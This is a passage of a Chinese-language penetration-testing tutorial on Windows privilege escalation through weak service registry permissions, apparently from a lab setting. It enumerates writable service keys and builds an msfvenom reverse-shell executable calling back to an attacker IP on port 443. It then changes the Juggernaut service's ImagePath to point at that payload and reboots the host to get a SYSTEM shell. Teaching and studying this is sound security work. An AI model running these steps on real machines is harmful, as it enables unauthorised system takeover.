<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193920726-151066335-bf816a4b257676b0960fbbd41b632429.png" width="620" height="67" class="img_ev3q"></p>
<p>由于该文件非常庞大，因此，我们需要使用一些 Linux 技巧，以将输出内容缩减到只包含我们感兴趣的信息，这样才能更容易地发现异常值。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat service_keys.txt | grep -i &quot;Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>输出的内容依旧很多，但基本上就是一条 Path 对应一条 Access，同时还看到许多显示“ ReadKey”的权限。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193920709-2133312048-b019643b2cfdf1f08f97a9c12807754e.png" width="978" height="456" class="img_ev3q"></p>
<p>为此，我们需要使用以下命令省略 ReadKey 的输出：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat service_keys.txt | grep -i &quot;Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users&quot; | grep -v &quot;ReadKey&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这次，虽然“ReadKey”没有了，但 Path 和 Access 一对一的关系也被打破了，好多 Access 的行会粘连在一块。为此，我们需要再次筛选只会在 Access 行中出现的 Authenticated Users、FullControl 等关键信息，并指定行被匹配的同时还要附带匹配行上面的一行信息，即 <code>-B 1</code>，最终命令如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat service_keys.txt | grep -i &quot;Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users&quot; | grep -v &quot;ReadKey&quot; | grep -B 1 -i &quot;Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这次效果就好多了，输出内容由刚开始的 10,000 多行减少到了大约 40 行，在这 40 行的数据中我们很快就发现了异常！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922017-175386-7cb59bf26a251836c4e751375ff253ae.png" width="996" height="671" class="img_ev3q"></p>
<p>当找到了弱权限的注册表路径后，就可以使用 Get-Acl 进行专项查询：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Acl -Path hklm:\System\CurrentControlSet\services\Juggernaut | Format-List</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922443-157592656-223c816e6c22a7225b5fb107f531112c.png" width="972" height="345" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="13枚举弱权限注册表项winpeasexe"><strong><div id="id1.3">1.3、枚举弱权限注册表项：winPEAS.exe</div></strong><a href="#13枚举弱权限注册表项winpeasexe" class="hash-link" aria-label="13枚举弱权限注册表项winpeasexe的直接链接" title="13枚举弱权限注册表项winpeasexe的直接链接">​</a></h4>
<p>第三种查找服务弱权限注册表项的方法是使用 <a href="https://github.com/carlospolop/PEASS-ng/" target="_blank" rel="noopener noreferrer">winPEAS.exe</a> 枚举工具，而这可能是查找弱权限注册表项最简单的方法。</p>
<p>将 winPEASx64.exe 的副本下载并传输到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921121-1727622067-5cb4cc71d5b390604baa3c9b86885881.png" width="451" height="230" class="img_ev3q"></p>
<p>执行 winPEAS 之后，我们可以在“<strong>Services Information</strong>”部分找到任何错误配置的服务注册表项。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921833-1843226224-66deae3745f8153ba1a577d7e9d6f4d4.png" width="998" height="99" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2分析服务的弱权限注册表项"><strong><div id="id2">2、分析服务的弱权限注册表项</div></strong><a href="#2分析服务的弱权限注册表项" class="hash-link" aria-label="2分析服务的弱权限注册表项的直接链接" title="2分析服务的弱权限注册表项的直接链接">​</a></h2>
<p>在经过上面的枚举之后，我们找到了一个令人感兴趣的服务注册表项：Juggernaut。接下来，我们就需要针对这个键去查看它下面和服务相关的值的信息。</p>
<p>可以使用 cmd.exe 或 PowerShell 命令去枚举服务。</p>
<p>使用 cmd.exe：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg query &quot;HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922018-1577818389-84d9b96b7e6cc6e17380119d774ca463.png" width="686" height="178" class="img_ev3q"></p>
<p>使用 PowerShell：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Item -Path Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922099-1737523694-8bbb38e4c59e621ff9dd49ad7f8ac1a2.png" width="822" height="258" class="img_ev3q"></p>
<p>在上面的输出中，可以看到键值“ImagePath”指向了 <code>C:\Program Files\Juggernaut\Juggernaut.exe</code> 文件，而这就是服务的启动程序；键值“ObjectName”是 LocalSystem，表示服务以 SYSTEM 身份运行；键值“Start”是 2，表示服务可以通过开机自启动。</p>
<p>又尝试看了一下 <code>C:\Program Files\Juggernaut\</code>目录和 Juggernaut.exe 文件的权限，发现我们并没有写入的权限（权限标识中没有出现 F、M、W 这些字符）。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">icacls &quot;C:\Program Files\Juggernaut\Juggernaut.exe&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">icacls &quot;C:\Program Files\Juggernaut&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193923106-427288519-8d5eb7c82353ffd2c1d0fd0ea9eff800.png" width="956" height="448" class="img_ev3q"></p>
<p>此时，有趣的地方出现了。虽然我们没有服务启动程序所在目录和文件的修改权限，但由于我们有权限修改该服务的注册表项，因此就可以通过更改服务注册表键值“ImagePath”的路径来指向我们控制的文件。</p>
<p>由于这项服务是可以自启动的，而我们又拥有该主机的重启操作，因此我们就可以通过重启系统来强制重启服务。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193922657-802249136-dd5b51b83a7c2d25b7197737ed7cae92.png" width="618" height="226" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3利用服务的弱权限注册表项"><strong><div id="id3">3、利用服务的弱权限注册表项</div></strong><a href="#3利用服务的弱权限注册表项" class="hash-link" aria-label="3利用服务的弱权限注册表项的直接链接" title="3利用服务的弱权限注册表项的直接链接">​</a></h2>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31制作恶意程序"><strong><div id="id3.1">3.1、制作恶意程序</div></strong><a href="#31制作恶意程序" class="hash-link" aria-label="31制作恶意程序的直接链接" title="31制作恶意程序的直接链接">​</a></h4>
<p>接着，我们需要制作一个恶意程序以供利用使用：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o pwnt.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921464-431853120-98f5d1d0acc0057966ad06c04cb6caa4.png" width="964" height="110" class="img_ev3q"></p>
<p>准备就绪后，我们将其转移到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193920928-1159788155-0f79bca5eb05561040468e35d7cae1b2.png" width="460" height="304" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32利用注册表键"><strong><div id="id3.2">3.2、利用注册表键</div></strong><a href="#32利用注册表键" class="hash-link" aria-label="32利用注册表键的直接链接" title="32利用注册表键的直接链接">​</a></h4>
<p>接下来，我们需要做的第一件事就是更改 Juggernaut 服务注册表键值上的 ImagePath，使其指向我们受控的恶意程序。可以使用以下命令来完成这项工作：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Juggernaut&quot; /v ImagePath /t REG_EXPAND_SZ /d &quot;C:\temp\pwnt.exe&quot; /f</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193920587-213909770-2114531b94d2bb58fa06bcba72be337a.png" width="1024" height="249" class="img_ev3q"></p>
<p>成功修改 ImagePath 以指向受控的恶意程序后，我们需要返回攻击者机器，启动一个 443 端口的 netcat 监听器，然后重启受害者主机。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">shutdown /r /t 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>等待大约20秒钟后，回到监听器，看到我们获得了一个 SYSTEM shell！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250321193921670-1030364352-6ea66d00eacf189175fb92ef606c35ad.png" width="491" height="178" class="img_ev3q"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权-服务_弱服务权限</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-服务_未引用的服务路径</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1搜寻服务的弱权限注册表项" class="table-of-contents__link toc-highlight"><strong><div>1、搜寻服务的弱权限注册表项</div></strong></a></li><li><a href="#2分析服务的弱权限注册表项" class="table-of-contents__link toc-highlight"><strong><div>2、分析服务的弱权限注册表项</div></strong></a></li><li><a href="#3利用服务的弱权限注册表项" class="table-of-contents__link toc-highlight"><strong><div>3、利用服务的弱权限注册表项</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>